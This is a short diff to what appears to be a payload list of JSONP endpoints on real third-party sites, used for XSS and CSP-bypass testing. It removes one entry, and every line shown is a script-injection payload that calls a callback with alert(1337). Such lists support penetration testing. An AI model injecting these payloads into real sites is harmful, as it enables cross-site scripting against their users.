@@ -49,7 +49,6 @@
 "><script+src="https://passport.ngs.ru/ajax/check?callback=alert(1337)"></script>
 "><script+src="https://ulogin.ru/token.php?callback=alert(1337)"></script>
 "><script+src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>
-"><script+src="https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)"></script>
 "><script+src="https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)"></script>
 "><script+src="https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)"></script>
 "><script+src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>
